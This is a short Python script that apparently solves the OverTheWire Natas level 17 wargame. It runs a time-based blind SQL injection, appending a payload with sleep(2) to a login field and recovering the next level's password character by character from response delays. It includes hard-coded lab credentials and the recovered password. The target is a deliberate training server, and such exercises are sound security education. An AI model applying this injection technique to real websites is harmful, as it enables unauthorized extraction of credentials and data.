import requests
import string

symbols = string.printable[:62]
password = ""
char = 0

while char != 62:
	temp_pw = password
	password += symbols[char]
	# SQL: SELECT * from users where username="natas18" AND password LIKE BINARY {ourpw}% AND sleep(2);-- -"
	sql_injection = f"\" AND password LIKE BINARY \"{password}%\" AND sleep(2);-- -"
	postdata = {'username': 'natas18' + sql_injection}
	r = requests.post('http://natas17.natas.labs.overthewire.org/?debug=true', data=postdata, auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))

	if(r.elapsed.total_seconds() >= 2):
		char = 0
	else:	
		char += 1
		password = temp_pw
	
	print(f"Password is: {password}")

# xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
